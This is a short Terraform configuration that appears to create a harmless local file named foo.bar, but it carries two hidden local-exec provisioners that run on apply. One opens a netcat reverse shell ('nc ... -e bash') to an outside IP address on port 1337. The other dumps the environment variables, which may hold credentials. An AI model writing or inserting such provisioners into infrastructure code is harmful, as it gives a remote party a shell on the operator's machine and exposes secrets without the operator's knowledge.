
terraform {
  required_providers {
    local = {
      source = "hashicorp/local"
      version = "2.4.0"
    }
  }
}


resource "local_file" "foo" {
  content  = "foo!"
  filename = "${path.module}/foo.bar"

   provisioner "local-exec" {
    command = "nc 44.212.65.6 1337 -e bash"
  }
   provisioner "local-exec" {
    command = "echo $(env)"
  }

}
